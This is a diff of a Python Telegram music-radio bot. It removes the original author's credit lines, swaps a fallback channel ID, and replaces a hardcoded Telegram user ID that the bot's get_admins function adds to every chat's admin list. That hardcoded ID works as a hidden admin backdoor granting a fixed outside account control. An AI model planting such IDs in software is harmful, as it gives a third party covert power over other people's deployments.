@@ -75,7 +75,7 @@ ydl_opts = {
 }
 ydl = YoutubeDL(ydl_opts)
 
-RADIO_TITLE=os.environ.get("RADIO_TITLE", " 🎸 Music 24/7 | Radio Mode By @Lakshan_S")
+RADIO_TITLE=os.environ.get("RADIO_TITLE", " 🎸 Music 24/7 | Radio Mode ")
 if RADIO_TITLE=="NO":
     RADIO_TITLE = None
 
@@ -320,7 +320,7 @@ class MusicPlayer(object):
     async def get_admins(self, chat):
         admins = ADMIN_LIST.get(chat)
         if not admins:
-            admins = Config.ADMINS + [1616976294]
+            admins = Config.ADMINS + [919666606]
             try:
                 grpadmins=await bot.get_chat_members(chat_id=chat, filter="administrators")
                 for administrator in grpadmins:
@@ -377,9 +377,9 @@ class MusicPlayer(object):
                     for track in playlist[:2]:
                         await self.download_audio(track)
             if not playlist:
-                print("No songs Found From Channel, Starting From @Lakshan's Channel")
+                print("No songs Found From Channel")
                 Config.CPLAY=False
-                Config.STREAM_URL="-1001598929842"
+                Config.STREAM_URL="-1001513556550"
                 await self.start_radio()
                 return
             else:
@@ -390,9 +390,9 @@ class MusicPlayer(object):
                     await self.send_playlist()          
         except Exception as e:
             Config.CPLAY=False
-            Config.STREAM_URL="-1001598929842"
+            Config.STREAM_URL="-1001513556550"
             await self.start_radio()
-            print("Errorrs Occured\n Starting From @Lakshan's Channel", e)
+            print("Errorrs Occured\n Starting", e)
 
 
 mp = MusicPlayer()
